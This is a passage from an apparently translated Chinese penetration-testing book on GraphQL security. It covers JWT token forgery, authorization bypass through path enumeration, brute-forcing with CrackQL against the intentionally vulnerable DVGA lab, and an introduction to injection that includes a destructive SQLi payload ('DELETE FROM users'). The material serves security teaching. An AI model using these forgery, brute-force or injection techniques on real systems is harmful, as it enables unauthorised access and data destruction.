  \ api_token：\n\n```\n{\n  \"type\": \"access\",\n  \"iat\": 1657046629,\n  \"nbf\"\
  : 1657046629,\n  \"jti\": \"5d38d3f9-cc55-472c-b74a-8b7ae3124ae2\",\n  \"identity\"\
  : \"operator\",\n  \"exp\": 1657053829,\n  \"api_token\":\"API_SECRET_PASSWORD\"\
  \n}\n```\n\n通过解码和测试 JWT 令牌的内容，我们可以对应用程序获得大量洞察。\n\n另一种绕过弱 JWT 身份验证控制的方法是通过伪造我们自己的\
  \ JWT 令牌。如果 GraphQL API 未能正确验证 JWT 令牌的签名，它就会容易受到伪造攻击，在这种攻击中，攻击者可以编码自己的用户详细信息。\n\n\
  让我们通过伪造管理员的 JWT 令牌来对 DVGA 执行一次 JWT 伪造攻击。首先，复制我们在“使用查询批处理暴力破解密码”第 173 页中成功暴力破解 operator\
  \ 密码时收到的 accessToken JWT。我们可以通过将它作为 token 参数发送到 DVGA 中的 me 查询操作来验证 accessToken 是否有效：\n\
  \n```\nquery {\n  me(token: \"eyJoeXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJoeXBlIjoiYWNjZXNzIiwiaWFwFOIj\n\
  oxNjU3MDQ2NjI5LCJuYvYioJE2NTcwNDY2MjksImp0aS6I6I jVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLT\n\
  hiN2FlMzEyNGF1MiIsImkZW5OaXR5Ijoib3BlcmFob3IilLCJleHAioJE2NTcwNTM4Mj19.Ba3zfvSZq\n\
  jDmyLFdx71Wcs-7vidaxpUfs2X3UK3zZBA\"){\n    id\n    username\n    password\n  }\n\
  }\n```\n\nDVGA 将根据 JWT 中的 identity 声明对用户进行身份验证，并使用 me 查询操作返回已认证的用户对象字段：\n\n```\n\
  {\n  \"data\": {\n    \"me\": {\n      \"id\": \"2\",\n      \"username\": \"operator\"\
  ,\n      \"password\": \"******\"\n    }\n  }\n}\n```\n\n接下来，让我们将 JWT 字符串粘贴到 https://jwt.io，如图\
  \ 7-3 所示。该网站将自动解码并以更易读的形式呈现三个 JWT 段。\n\n在右侧面板中，我们可以直接修改解码后的 payload 的 JSON 数据，将\
  \ \"identity\": \"operator\" 行更改为 \"identity\": \"admin\"。你会注意到 https://jwt.io 会在左侧面板中自动编码\
  \ payload 的更改。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_205_0.png)\n\n图 7-3：使用\
  \ https://jwt.io 解码的 DVGA operator 的 accessToken\n\n现在尝试将此伪造的 JWT 令牌用于 me 操作。只需复制\
  \ JWT 并将其粘贴到查询的 token 参数中即可。由于 DVGA 不验证 JWT 签名，它将使用伪造的 JWT 令牌对我们的请求进行身份验证并返回 admin\
  \ 用户的密码：\n\n```\n{\n  \"data\": {\n    \"me\": {\n      \"id\": \"1\",\n      \"\
  username\": \"admin\",\n      \"password\": \"changeme\"\n    }\n  }\n}\n```\n\n\
  当客户端更改 JWT 令牌时，其签名应变得无效。未使用其密钥验证此签名的 GraphQL API 将容易受到伪造攻击。\n\n## 授权测试\n\n与身份验证一样，开发人员可以采用多种方法来实现授权。当获得受限的\
  \ GraphQL 用户账户时，我们作为黑客，应该看看能将权限提升到什么程度。特别是，我们应该确定是否能够绕过旨在阻止我们读取用户数据或执行某些提升功能的控制。\n\
  \n与 REST 一样，GraphQL 也可能容易受到各种授权攻击，具体取决于 API 如何处理权限控制。未能在函数级别保护未经授权的访问可能会导致敏感数据泄露或破坏性操作的执行。\n\
  \nGraphQL 特定的授权缺陷通常出现在权限检查发生在解析器级别或在执行任何业务逻辑或状态更改之后。让我们学习如何检测一些这些授权方法并探索它们可能存在的攻击。\n\
  \n## 检测授权层\n\n我们可以通过几种方式来检测 API 是否使用授权控制，以及使用何种类型的控制。\n\n### 查找 Schema 指令\n\n我们之前提到，开发人员有时会使用\
  \ schema 指令来实现授权。如果你可以访问 API 的 SDL 文件，你可以识别这些 schema 指令。或者，你可以发送如 Listing 7-8 所示的专门的\
  \ introspection 查询。\n\n```\nquery {\n  __schema {\n    directives {\n      name\n\
  \      args {\n        name\n      }\n    }\n  }\n}\n```\n\nListing 7-8：用于获取指令名称和参数的\
  \ introspection 查询\n\n运行此查询将返回目标服务器中所有查询级和 schema 级指令的列表。如果你在列表中注意到 @auth 指令，你可以假设\
  \ schema 支持它。当然，开发人员可以为指令命名不同的名称，因此还应查找 @authorize、@authorization、@authz 等名称。\n\n\
  ### 在 Schema 中查找身份验证指令\n\n如果我们执行 introspection 查询来识别指令，我们将知道是否存在 @auth 指令。然而，我们不会知道此指令在\
  \ schema 中应用的位置，因为此信息不会在 introspection 查询中公开。这是因为客户端不会调用 schema 级指令；相反，开发人员使用它们来防止未经授权的访问，以及其他用例。\n\
  \n来看一下 Listing 7-9 中的 User 对象类型示例。\n\n```\nType User {\n  id: ID\n  username: String\n\
  \  email: String\n  password: String @auth(requires: ADMIN)\n  role: String\n}\n\
  ```\n\nListing 7-9：schema 中 @auth 指令使用示例\n\n你在白盒渗透测试中扫描 schema 以查找 @auth 指令会很有用，白盒测试会提供你\
  \ SDL 文件。但在不提供 schema 访问权限的黑盒测试中，你可能知道 password 字段存在，但不知道 @auth 指令是否适用于它。\n\nGraphQL\
  \ 开发者社区讨论过在 introspection 系统中公开 schema 级指令使用信息。然而，许多 GraphQL 实现目前不公开此信息。\n\n###\
  \ 使用 graphql-path-enum 枚举路径\n\n为了测试授权控制，你应该尝试以你能想象的尽可能多的方式访问敏感字段。例如，考虑以下来自 DVGA\
  \ schema 的摘录，其中三个查询访问 PasteObject：\n\n```\ntype Query {\n  pastes(public: Boolean,\
  \ limit: Int, filter: String): [PasteObject]\n  paste(id: Int, title: String): PasteObject\n\
  \  --snip--\n  users(id: Int): [UserObject]\n  readAndBurn(id: Int): PasteObject\n\
  \  search(keyword: String): [SearchResult]\n  audits: [AuditObject]\n  deleteAllPastes:\
  \ Boolean\n  me(token: String): UserObject\n}\n```\n\n作为客户端，你可以使用 pastes、paste 或\
  \ readAndBurn 返回有关 pastes 的信息。在实现基于带的授权时，开发人员可能会意外地只保护其中一些查询。因此，确定到达给定对象类型的所有可能路径。\n\
  \nSchema 可能会非常庞大，因此你会发现自动化识别到达给定对象类型的所有路径的过程很有帮助。对于此任务，我们将使用 graphql-path-enum。此工具期望两个重要参数：introspection\
  \ JSON 响应和我们想要测试授权问题的对象类型的名称。让我们用它来查找到达 PasteObject 对象类型的所有路径。\n\n首先，通过将 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt\
  \ 中的查询粘贴到 Altair 中运行完整的 introspection 查询。发送请求并将响应复制到名为 introspection.json 的文件中。接下来，将此文件提供给\
  \ graphql-path-enum，并告诉它搜索所有通往 PasteObject 对象的路径，如 Listing 7-10 所示。\n\n\n\n\n\n\
  ```\n# cd ~\n# ./graphql-path-enum -i introspection.json -t PasteObject\n\nFound\
  \ 3 ways to reach the \"PasteObject\" node:\n- Query (pastes) -> PasteObject\n-\
  \ Query (paste) -> PasteObject\n- Query (readAndBurn) -> PasteObject\n```\n\nListing\
  \ 7-10: Performing type path enumeration with graphql-path-enum\n\n正如你所见，graphql-path-enum\
  \ 遍历了 introspection 响应并识别了到达该对象的全部可能查询路径。现在我们可以手动发送这三个查询，看看其中是否有任何一个可以访问其他查询无法访问的对象。\n\
  \n如果你想在大型复杂的 GraphQL API 中练习 schema 遍历，可以尝试对流行的 Star Wars API（SWAPI）中的 Vehicle 对象类型运行\
  \ graphql-path-enum。该 API 的 schema 比 DVGA 更大，应该能说明在测试授权问题时路径枚举的重要性。你可以在 https://github.com/dolevjf/Black-Hat-GraphQL/blob/master/ch07/starwars-schema.json\
  \ 访问 SWAPI schema。\n\n## Brute-Forcing Arguments and Fields with CrackQL\n\n由于 graphql-path-enum\
  \ 仅适用于对象类型，你可能会尝试在第 6 章中讨论的 field-stuffing 技术，以测试旨在限制未授权用户可查看数据量的弱或不存在的授权控制。我们也可以使用\
  \ CrackQL 来以编程方式暴力破解我们不应访问的参数和字段。想象一个如下所示的查询：\n\n```\nquery {\n  users(id: 1) {\n\
  \    username\n    password\n  }\n}\n```\n\n现在，假设访问某些用户的信息需要特殊的授权权限。我们知道用户 ID 是数字且递增的，但不知道哪些受保护。让我们尝试用\
  \ CrackQL 暴力破解它们。\n\n在 CrackQL 文件夹下的 sample-queries 中，创建一个名为 users.graphql 的新文件，内容如下：\n\
  \n```\nquery {\n  users(id: {{id|int}}) {\n    username\n    password\n  }\n}\n\
  ```\n\n此查询使用带有 Int 类型的 id 参数的 users 字段。由于查询接受 id 参数，我们可以通过递增提供一系列数字用户标识符来尝试枚举账户。CrackQL\
  \ 将渲染 {{id|int}} 字符串并用我们接下来要创建的 wordlist 中的词替换它。\n\n让我们将可能的 user ID 字典创建为单列 CSV\
  \ wordlist。这样的列表很容易用一些 Bash-fu 生成：\n\n```\n# cd ~/CrackQL\n# echo \"id\" > sample-inputs/users.csv\n\
  # for id in `seq 1 100`; do echo $id >> sample-inputs/users.csv; done\n```\n\n接下来，通过打印前五行检查文件是否已正确生成：\n\
  \n```\n# head -5 sample-inputs/users.csv\n\nid\n1\n2\n3\n4\n```\n\n现在运行 CrackQL\
  \ 以查找有效的用户 ID 并检索其 username 和 password 字段：\n\n```\n# python3 CrackQL.py -t http://localhost:5013/graphql\
  \ -q sample-queries/users.graphql -i sample-inputs/users.csv --verbose\n\n[+] Verifying\
  \ Payload Batch Operation...\n[+] Sending Alias Batch 1 of 1 to http://localhost:5013/graphql...\n\
  ========================================\nResults:\n\nData:\n[{'alias1': {'data':\
  \ [{'password': '******', 'username': 'admin'}], 'inputs': {'id': '120'}}, {'alias2':\
  \ {'data': [{'password': '******', 'username': 'operator'}], 'inputs': {'id': '120'}},\
  \ {'alias3': {'data': [], 'inputs': {'id': '120'}}}],\n```\n\n你也可以以同样的方式暴力破解你怀疑因授权控制而无法访问的字段，只需修改原始查询以包含这些潜在字段即可：\n\
  \n```\nquery {\n  users(id: {{id|int}}) {\n    username\n    password\n    accessToken\n\
  \  }\n}\n```\n\n```\nbirthDate\nlocation\n}\n}\n```\n\nCrackQL 将在 ~/CrackQL/results\
  \ 文件夹下保存所有尝试的输出。如果这些字段可访问，你将在那里看到对它们的响应。\n\n## Summary\n\n在本章中，你了解了带内和带外的 GraphQL\
  \ 身份验证和授权架构模型。我们回顾了开发者可能在其 GraphQL 部署中采用的几种传统控制，并指出了它们可能易受攻击的弱点。例如，使用 JWT token\
  \ 的 GraphQL 实现可能容易受到 token 伪造的攻击。我们还将你的注意力引导到更新的、GraphQL 专用的身份验证和授权库和插件，例如 GraphQL\
  \ Modules、GraphQL Shield 和自定义 schema 指令。\n\n通过利用 GraphQL 的别名基于查询批处理等特性，我们可以手动暴力破解带内身份验证操作或使用\
  \ CrackQL 自动执行。使用 graphql-path-enum，我们可以枚举到类型的路径，并再次使用 CrackQL，我们可能在没有适当授权控制的情况下访问字段。\n\
  \n在下一章中，我们将转向另一个古老而常见的漏洞类别：注入，这些漏洞即使针对像 GraphQL 这样的现代 API 服务也继续造成破坏。\n\n# 8\n\n\
  # INJECTION\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_212_0.png)\n\n客户端以多种方式与\
  \ API 交互，例如创建、修改或删除数据。当应用程序必须处理其任意输入时，就会产生挑战。应用程序是否应该信任外部客户端发送的输入？内部客户端呢？\n\n在本章中，你将了解注入漏洞，并发现为什么识别和保护由\
  \ GraphQL API 支持的应用程序的各种入口点很重要，以及不这样做的后果。我们将识别影响应用程序逻辑并操纵其执行其未专门设计的操作的机会。成功的注入可能导致从网页操纵到在数据库上执行代码等各种结果。\n\
  \nGraphQL 服务器通常与数据存储一起工作，例如关系数据库如 MySQL、文档数据库如 Elasticsearch、键/值存储如 Redis，甚至图数据库如\
  \ Neo4j。所有这些都可能\n\n容易受到基于注入的漏洞的影响。在本章中，我们将讨论三种类型的注入漏洞。其中一些，如 SQL 注入（SQLi）和操作系统命令注入，影响后端服务如服务器和数据库。另一种，XSS，影响客户端。\n\
  \n## Injection Vulnerabilities in GraphQL\n\n注入漏洞发生在应用程序接受并处理不可信的输入而没有任何清理时。清理是一种安全措施，涉及检查输入并从中删除可能危险的字符。缺少此类检查可能会允许输入被解释为命令或查询并在客户端或服务器端执行。注入是一类广泛的攻击，可能影响网络生态系统，例如操作系统、客户端浏览器、数据库、第三方系统等。\n\
  \n应用程序可能以多种方式意外引入注入漏洞，包括以下内容：\n\n- 应用程序未对其接收的输入实施安全检查。\n- 应用程序使用不安全的库（例如解析器）来处理用户输入。\n\
  - 应用程序将接收到的用户输入传递给第三方系统，而该系统未对输入实施安全检查。\n- 应用程序接受输入并在不以任何方式转换的情况下将其显示给客户端。\n\n一旦应用程序开始允许客户端通过查询、mutation\
  \ 或 subscription 的参数等接口操纵数据，实现 GraphQL API 的应用程序就可能变得容易受到注入漏洞的影响。即使是仅允许客户端读取数据的\
  \ GraphQL API，也可能在某些接口（如查询过滤器）中存在漏洞。虽然风险可以降低，但几乎从未为零。\n\n在构建 API 时，完全避免接受用户输入是很困难的。随着应用程序变得更复杂，它需要某种输入才能有用。例如，像\
  \ Twitter 或 Facebook 这样的网站如果不允许用户输入就完全没有意义。用户操作，如发推文、在某人的 Facebook 墙上写帖子，或将晚餐照片上传到\
  \ Instagram，都需要用户输入。\n\n## The Blast Radius of Malicious Input\n\n无论来自人类客户端，还是来自网络上其他服务器等机器，都必须考虑输入可能是恶意的。即使内部机器也可能被入侵并向其他服务器发送恶意输入。\n\
  \n\n\n\n\n应用程序通常是在宽松的信任模型下开发的。这种信任模型假设从同一网络上的其他内部系统进入 GraphQL API 的输入是安全的，而来自外部来源的输入是不安全的。这种做法非常常见，但以这种方式设计系统可能会适得其反；如果我们能够入侵一个系统并向网络上的另一台主机发送命令，我们就可以轻松地横向移动到其他服务器。图\
  \ 8-1 说明了类似的场景。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_214_0.png)\n\n图 8-1：网络信任边界\n\
  \n该图描述了一次渗透测试，其中我们识别出一个面向互联网的 GraphQL API 服务器，即公网服务器。该服务器恰好是双宿主的，这意味着它有两个网络接口，属于两个不同的网络。该服务器容易受到注入攻击，因为它没有充分检查从客户端收到的传入查询。\n\
  \n现在，想象一下图中内部服务器也是一台 GraphQL 服务器，设计为信任来自同一网络上系统的任何传入查询。它之所以这样配置，是因为它不面向互联网，并且在威胁模型中，安全架构师假设本地网络是安全的。然而，如果公网服务器被攻破，攻击者就可以向内部服务器发送恶意查询。\n\
  \n这就是为什么始终对任何用户输入执行安全检查如此重要。 这也是为什么当我们发现允许输入时，黑客必须测试注入漏洞至关重要的原因。\n\n## OWASP Top\
  \ 10\n\n每隔几年，OWASP 都会在 OWASP Top 10 项目下发布针对 Web 应用程序的新漏洞类别排名，以帮助公司将其安全缓解工作重点放在最常见的软件缺陷类别上。\n\
  \n注入漏洞类别已在 OWASP Top 10 列表中存在近二十年。在最新的 OWASP Top 10 版本中，注入漏洞排名第三，如表 8-1 所示。\n\n\
  表 8-1：OWASP Top 10\n\n| Identifier | Vulnerability |\n|------------|---------------|\n\
  | A01 | Broken access control |\n| A02 | Cryptographic failures |\n| A03 | Injection\
  \ |\n| A04 | Insecure design |\n| A05 | Security misconfiguration |\n| A06 | Vulnerable\
  \ and outdated components |\n| A07 | Identification and authentication failures\
  \ |\n| A08 | Software and data integrity failures |\n| A09 | Security logging and\
  \ monitoring failures |\n| A10 | Server-side request forgery |\n\nOWASP 还开始在专门的项目\
  \ API Security Top 10 下跟踪 API 中的主要漏洞。这种拆分有助于区分 API 和非 API 漏洞。在截至本文撰写时的最新项目版本中，注入排名第八，如表\
  \ 8-2 所示。\n\n表 8-2：API Security Top 10\n\n| Identifier | Vulnerability |\n|------------|---------------|\n\
  | API1 | Broken object-level authorization |\n| API2 | Broken user authentication\
  \ |\n| API3 | Excessive data exposure |\n| API4 | Lack of resource and rate limiting\
  \ |\n| API5 | Broken function-level authorization |\n| API6 | Mass assignment |\n\
  | API7 | Security misconfiguration |\n| API8 | Injection |\n| API9 | Improper asset\
  \ management |\n| API10 | Insufficient logging and monitoring |\n\n注入漏洞在 API 中可能造成毁灭性后果，在进行渗透测试时，了解在非\
  \ API Web 应用程序和 API 中进行注入测试非常重要。\n\n## 注入攻击面\n\nGraphQL API 通常设计为从客户端接收输入，执行后端操作，例如数据库的读写，并返回响应。\n\
  \n从技术上讲，你可以拥有只读查询，例如以下查询，它不会在服务器端更改任何内容。客户端不能使用该查询传递任意数据，只能传递在 GraphQL 模式中定义的 GraphQL\
  \ 字段 id 和 ipAddr，正如你在第 3 章中可能记得的那样：\n\n```\nquery {\n  pastes {\n    id\n    ipAddr\n\
  \  }\n}\n```\n\n如果应用程序未设计为以允许其修改服务器上数据的方式与客户端交互，应用程序开发人员可以仅使用只读操作，但实际上这种情况几乎永远不会发生。随着应用程序变得更加复杂和功能丰富，它们将需要通过诸如查询参数、字段参数或两者等接口接受客户端输入。\n\
  \n让我们在深入研究各种注入漏洞之前，先考虑几个允许客户端传递任意输入的 GraphQL 组件。对于这些接口中的每一个，你都应该问自己几个重要问题：\n\n-\
  \ 应用程序是否在验证传入的客户端输入？\n- 应用程序是否接受危险字符？\n- 当作为查询的一部分发送意外字符时，应用程序是否会抛出异常？\n- GraphQL\
  \ 是否检查传递给参数的值类型？\n- 我们能否从 GraphQL 服务器响应（或带外响应）中推断出注入尝试是否成功？\n\n注入测试需要一些反复试验，但一旦你取得突破，你会感到非常满意。\n\
  \n### 查询参数\n\nGraphQL 操作例如查询、变更和订阅可以设计为接受参数。考虑以下查询，它传递一个 limit 参数，其整数值为 100。虽然此操作仍然是只读的，但它通过使用查询过滤器提供了操作服务器响应的接口：\n\
  \n```\nquery {\n  pastes(limit: 100) {\n    id\n    ipAddr\n  }\n}\n```\n\n此参数不允许我们执行代码，但我们可以用多种方式利用它来影响服务器。例如，向\
  \ Int 类型参数 limit 提供负值（例如 -1）可能会导致意外行为。有时 API 将 -1 值解释为返回全部，在这种情况下，服务器将返回对象的整个列表。\n\
  \n当你识别到类型为 String 的参数时，你可能需要花一些时间尝试各种注入负载。考虑清单 8-1 中的 GraphQL 变更，它使用 createPaste\
  \ 顶级字段。\n\n```\nmutation {\n  createPaste(content: \"Some content\", title:\"Some\
  \ title\", public: false) {\n    paste {\n      id\n      ipAddr\n    }\n  }\n}\n\
  ```\n\n清单 8-1：变更输入点\n\ncreatePaste 字段非常容易理解；它从客户端获取信息并使用该数据在数据库中创建一个全新的 paste。在此示例中，客户端通过三个参数控制\
  \ paste 的格式：content、title 和 public。这些参数的类型不同。例如，content 和 title 是标量类型 String，而 public\
  \ 是标量类型 Boolean。\n\n想象一下，从数据库操作的角度来看，粘贴创建操作可能是什么样子。考虑以下 SQL 示例：\n\n```\nINSERT INTO\
  \ pastes (content, title, public)\nVALUES ('some_malicious_content', 'some_title',\
  \ false)\n```\n\n当客户端查询被 GraphQL API 接收时，服务器可能需要在数据库中查找信息或写入信息以履行查询。如果 GraphQL API\
  \ 设计为在没有适当安全验证的情况下处理来自 content 和 title 等参数的输入，数据可以直接注入到 SQL 命令中，这可能导致 SQLi 漏洞。\n\
  \n考虑以下 SQLi 示例，其中 SQL 命令被插入到 content 参数中：\n\n```\nmutation {\n  createPaste(content:\
  \ \"content'); DELETE FROM users; --\") {\n    paste {\n      id\n      ipAddr\n\
  \    }\n  }\n}\n```\n\n以这种方式构建的查询可能会在后端转换为 SQL 查询，并且可能看起来像这样：\n\n```\nINSERT INTO\
  \ pastes (content) VALUES ('content'); DELETE FROM users; --\n```\n\n注意 GraphQL\
  \ 是强类型的。这意味着当它看到类型不匹配时，它会拒绝它们。例如，类型为 Boolean 的参数不应接受类型为 String 的值，而只能接受 true 或 false\
  \ 值。提供给参数的值在查询在验证阶段处理期间会根据 GraphQL 模式进行验证。\n\n需要注意的是，GraphQL API 可以（并且应该）在查询解析器中具有多层防御性检查，以减轻任何形式的注入。\n\
  \n### 字段参数\n\n与顶级字段一样，GraphQL 选择集中的字段也可以接受参数。考虑以下查询：\n\n```\nquery {\n  users {\n\
  \    username(capitalize: true)\n    id\n  }\n}\n```\n\n使用此查询，我们可以返回用户 ID 和用户名的列表。默认情况下，响应中的\
  \ username 字段为小写。添加 capitalize 参数并将其设置为 true 会导致 GraphQL 解析器将用户名大写。\n\n字段参数可以实现为在字段中指定时执行不同的操作，并且在安全上下文中，与其他参数（例如指令的参数）并没有太大区别。传递给字段参数的值可以插入到数据库中或影响逻辑。应用程序甚至可能将它们用作不同内部\
  \ API 调用的部分，因此在存在这些参数时进行测试非常重要。\n\n### 查询指令参数\n\n附加到某些 GraphQL 字段的查询指令也可以接受参数，通常是\
  \ String 和 Boolean 等标量类型。这些指令的使用方式完全取决于实现，但始终值得检查它们允许客户端发送哪些类型的值。\n\n考虑以下查询：\n\n\
  ```\nquery {\n  pastes {\n    id\n    ipAddr @show_network(style: \"cidr\")\n  }\n\
  }\n```\n\n在此示例中，我们为指令 show_network 指定了一个名为 style 的参数。style 参数的类型为 String，并且接受任意字符串。在此示例中，我们提供\
  \ cidr 作为值。在后端，这会将 ipAddr（IP地址）字段转换为使用 Classless\n\n\n\nInter-Domain Routing (CIDR)\
  \ 表示法。例如，IPv4 地址 192.168.0.1 将变为 192.168.0.1/32。\n\n如果启用了 introspection，GraphQL\
  \ IDE 工具如 GraphiQL Explorer 或 GraphQL Playground 在字段上开始输入 at 符号 (@) 时就会自动补全指令名称及其参数。字段及其参数也是如此。\n\
  \n查询指令参数也容易受到注入攻击。攻击者可以利用它们来影响服务器返回特定字段的响应方式。例如，查询指令可能会使用 argument where，然后将其翻译为\
  \ SQL 匹配模式（例如 LIKE 操作符）。\n\n你可以使用第 8-2 节中所示的 introspection 查询，通过使用 __schema 元字段中的\
  \ directives 字段来获取仅可用的指令。\n\n```\nquery GetDirectives {\n  __schema {\n    directives\
  \ {\n      name\n      description\n      locations\n    }\n  }\n}\n```\n\nListing\
  \ 8-2: A GraphQL introspection query used to list directives\n\n## Operation Names\n\
  \n操作名称是我们可以添加到 GraphQL 操作（如查询、变更或订阅）中的字符串。它们通常用于在同时发送多个查询时唯一命名每个查询。GraphQL 图形 IDE\
  \ 如 GraphiQL Explorer 和 GraphQL Playground 使用操作名称作为一种方式，允许客户端通过下拉菜单在文档中存在多个查询时选择要运行的操作，如图\
  \ 8-2 所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_219_0.png)\n\nFigure 8-2:\
  \ Executing a selected query based on its operation name in GraphiQL Explorer\n\n\
  操作名称也用于其他目的，例如调试和日志记录。事实上，它们是有趣的潜在注入向量，因为应用程序可以用多种方式使用它们。例如，一些应用程序使用操作名称进行分析，以确定客户端使用最多的查询。操作名称字符串可能会出现在不同的系统中，例如日志系统、关系数据库、缓存数据库等。重要的是要检查\
  \ GraphQL API 是否允许操作名称中包含特殊字符，因为这可能成为可注入的接口。\n\n操作名称通常是字母数字的，但一些 GraphQL 服务器实现在允许的字符类型方面比其他实现更宽松。\n\
  \n## Input Entry Points\n\n在尝试对 GraphQL API 执行注入测试时，我们需要找到一种方法来发现输入入口点。如果我们幸运并且\
  \ introspection 保持启用，我们通常可以快速访问 API 支持的各种查询、变更和订阅，以及有关其类型、字段、参数等的信息，使用 Altair、GraphiQL\
  \ Explorer 或 GraphQL Playground 等 GraphQL IDE 工具。\n\n要在 Altair 中查看有关 DVGA 的此信息，将\
  \ URL 设置为 http://localhost:5013/graphql 并点击右上角的 Save 按钮（软盘图标）。点击 Save 按钮旁边的 Refresh\
  \ 按钮，然后点击 Docs。你应该会看到查询、变更和订阅的各个部分。点击其中任何一个以查看每个内部存在的参数类型，如图 8-3 屏幕截图所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_220_0.png)\n\
  \nFigure 8-3: Schema documentation in the Altair client\n\n如果运气不佳并且服务器上禁用了 introspection，我们可以依靠\
  \ Clairvoyance 等工具，我们在第 6 章中提到过它，来重建模式并发现各种可用的输入。Clairvoyance 将模糊 GraphQL 文档输入以发现其所有各种操作、字段、类型和参数，从而重建完整的模式视图，我们可以然后使用它来识别所有可能的输入。接下来我们将通过对\
  \ DVGA 执行注入测试，探索 GraphQL 世界中常见类型的注入可能是什么样子。\n\n## SQL Injection\n\n*SQL injection*\
  \ 是最古老的类型漏洞之一。SQLi 漏洞发生在客户端输入直接插入到 SQL 命令中而未进行适当的字符转义时。此条件允许黑客关闭预期 SQL 查询并引入自己的\
  \ SQL 命令，从而有效地干扰应用程序对其数据库的查询。\n\nGraphQL API 中的 SQLi 漏洞可能造成毁灭性后果。对数据库的完全或部分访问可能导致以下任何后果：\n\
  \n- **Impact to data integrity.** SQLi 漏洞可能允许我们操纵数据，例如通过更改数据库表中的数据。\n- **Impact\
  \ to data confidentiality.** SQLi 可能允许我们从数据库泄露信息，无论是从应用程序特定的 SQL 表还是同一数据库中的其他表。此信息可能包括\
  \ PII、密码哈希、敏感令牌等。\n- **Impact to data availability.** SQLi 可能允许我们删除数据库的某些部分或完全删除其表，导致数据丢失和应用程序不稳定。\n\
  \n近年来，现代 Web 框架在缓解 SQLi 漏洞方面做得更好，通过提供开箱即用的防御机制，例如参数化查询。利用经过审计和验证的框架使开发人员能够更安全地编写代码，通过使用框架的内置安全功能，例如通过函数和库。\n\
  \n## Understanding the Types of SQL Injection\n\nSQLi 漏洞有两类，每类都有几个子类。\n\n## Classic\
  \ SQL Injection\n\n当应用程序在注入测试期间返回 SQL 查询错误时，你就知道遇到了 *classic SQLi*。这些错误可以直接显示在网页中或通过网络检查变得明显。用于识别经典\
  \ SQLi 漏洞的两种技术是基于错误和基于联合。\n\n*Error-based SQLi* 用于通过错误观察来识别 SQLi 漏洞。应用程序在 SQL 查询执行失败时向客户端抛出\
  \ SQL 错误，这可能允许我们找到正确的攻击模式以成功利用 SQLi 漏洞。\n\nUnion-based SQLi 用于通过利用 UNION SQL 操作符来识别\
  \ SQLi 漏洞。UNION 将多个 SELECT 语句的结果连接起来，然后可以返回给客户端。\n\n## Blind SQL Injection\n\n在盲\
  \ SQLi 中，我们没有可见的迹象表明存在漏洞。应用程序可能会静默失败或将错误重定向到客户端之外。两种发现技术适用于盲 SQLi 类别。\n\nTime-based\
  \ SQLi 强制应用程序在返回响应之前等待一定时间。通过提供指示数据库等待特定秒数的 SQLi 有效负载，如果最终响应返回时出现类似延迟，我们可以推断应用程序存在漏洞。\n\
  \nBoolean-based SQLi 允许我们通过构造将返回布尔结果（如 true 或 false）的有效负载来推断应用程序是否容易受到 SQLi 攻击。通过使用此测试技术，我们可以影响应用程序向客户端呈现数据的方式，这有助于我们识别漏洞是否存在。\n\
  \n## Testing for SQLi\n\n虽然 SQLi 漏洞正在减少，但偶尔仍能找到。作为黑客，我们应该假设我们正在测试的应用程序可能没有适当的安全控制来防止\
  \ SQLi，并在可能的情况下随时进行测试。\n\n测试 SQLi 可以通过多种方式进行，例如以下：\n\n- 提交单引号 (') 或双引号 (\") 等字符并观察应用程序如何处理意外输入和错误。\n\
  - 模糊输入字段并观察可能指示数据库查询失败的应用程序错误。\n- 提交引入延迟的 SQL 命令，例如使用 BENCHMARK 和 SLEEP 用于 MySQL\
  \ 数据库，WAITFOR DELAY 和 WAITFOR TIME 用于 Microsoft SQL Server，或 pg_sleep 用于 PostgreSQL\
  \ 数据库，然后执行响应时间分析以识别注入是否成功。这在我们执行盲 SQLi 测试时尤其有帮助，此时应用程序错误对我们不可见。\n\nSQLi 在 GraphQL\
  \ 中可以通过接受客户端输入的任何接口引入。在本节中，我们将通过使用 DVGA 在 GraphQL 中探索一个 SQLi 示例。\n\n## Testing DVGA\
  \ for SQLi with Burp Suite\n\nGraphQL 注入测试的第一步是找到可以修改查询的位置。我们可以先查看模式\n\n\ndocumentation\
  \ in Altair。图 8-4 显示了 Query 部分。文档中还包含 mutation 和 subscription 部分，请也查看一下。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_223_0.png)\n\
  \n图 8-4：DVGA 中的查询\n\n如你所见，我们有几个可供选择的查询。现在我们必须确定优先关注的区域。请注意，某些字段，例如 systemUpdate、systemHealth、audits\
  \ 和 deleteAllPastes，不接受任何参数，因此我们最好关注那些接受参数的字段。让我们聚焦于 pastes 字段，它接受三个可选参数：\n\n- public，类型为\
  \ Boolean\n- limit，类型为 Integer\n- filter，类型为 String\n\nfilter 参数可能是 SQLi 测试的有价值候选，因为它接受字符串值，并且其名称暗示它会过滤结果。这种过滤可能涉及后端查询解析器逻辑，使用\
  \ SQL 操作，例如 SQL WHERE 运算符，以完成查询。\n\n现在我们有了目标，让我们开始与 DVGA 交互并代理流量。通过 Kali 的 Applications\
  \ 菜单打开 Burp Suite，然后点击 Open Browser 打开位于 Proxy 选项卡下的内置浏览器，并导航到 http://localhost:5013。应用程序加载后，确保\
  \ Burp Suite 处于 Intercept 模式。导航到 DVGA 左侧边栏中的 Private Pastes 页面。你应该会看到与图 8-5 类似的\
  \ GraphQL 请求。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_224_0.png)\n\n## 图 8-5：在\
  \ Burp Suite 中拦截 GraphQL 查询\n\n如你所见，DVGA 使用 GraphQL pastes 查询操作发送 HTTP POST 请求，以从\
  \ GraphQL API 服务器获取私有粘贴列表。\n\nNOTE 如果你没有立即看到发往 /graphql 的初始 POST 请求，请点击 Forward\
  \ 直到它出现。\n\n如果切换到 WebSockets History 选项卡，你会注意到 DVGA 也使用了 subscription 操作（图 8-6）。在此上下文中，subscription\
  \ 操作允许客户端通过订阅 pastes 事件，在粘贴创建后立即从 API 读取新的粘贴。\n\n为了更轻松地操作请求，通过在请求窗口的任意位置右键单击并点击\
